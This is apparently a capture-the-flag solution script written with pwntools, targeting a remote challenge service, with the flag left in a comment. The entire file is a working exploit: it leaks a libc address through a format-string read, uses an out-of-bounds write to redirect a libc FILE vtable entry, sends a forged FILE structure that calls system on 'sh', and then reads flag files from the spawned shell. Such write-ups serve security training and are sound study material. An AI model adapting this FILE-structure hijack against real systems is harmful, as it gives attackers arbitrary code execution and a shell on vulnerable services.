#!/usr/bin/env python3
from pwn import *

# AIS3{And_how_many_times_have_you_written_out_of_bound_write?}

context.arch = 'amd64'
l = ELF('libc-2.31.so')
y = remote( 'eof01.zoolab.org' , 3517 )

y.sendafter( 'name ?' , '%11$p'.ljust( 10 , '\0' ) )
y.recvuntil('0x')
l.address = int( y.recv(12) , 16 ) - 0x1ed4a0
success( f'libc -> {hex(l.address)}' )
addr = l.address + 0x222000
success( f'addr -> {hex(addr)}' )

y.sendlineafter( '?' , 'Yes' )

target = l.sym._IO_file_jumps + 0x78
target -= 8
idx = int(((0x10000000000000000 - addr) + target) // 4) - 4
idx &= 0xffffffffffffffff

p = l.sym.gets & 0xffffffff

y.sendline(str(p))
y.sendline(str(idx))

vtable = l.address + 0x1ec780
p = flat(
    0x00000000fb006873, l.address + 0x1ec723,    # "sh"
    #0x00000000fbad2887, l.address + 0x1ec723,
    l.address + 0x1ec723, l.address + 0x1ec723,
    l.address + 0x1ec723, l.address + 0x1ec723,
    l.address + 0x1ec723, l.address + 0x1ec723,
    l.address + 0x1ec724, 0,
    0, 0,
    0, l.address + 0x1eb980,
    1, 0xffffffffffffffff,
    0x000000, l.address + 0x1ee4c0,
    0xffffffffffffffff, 0,
    l.address + 0x1eb880, 0,
    0, 0,
    0xffffffff, 0,
    0, l.address + 0x1ec8a0,
    '\0' * 0x120,
    0x111111, 0x222222,
    0x333333, 0x444444,
    0x555555, 0x666666,
    0x777777, l.sym.system,
    0x999999, 0xaaaaaa,
    0xbbbbbb, 0xcccccc,
    0xdddddd, 0xeeeeee,
)
y.sendline( p )

y.sendlineafter( 'scanf' , '0' )

y.sendline( 'cat /home/*/flag' )

y.interactive()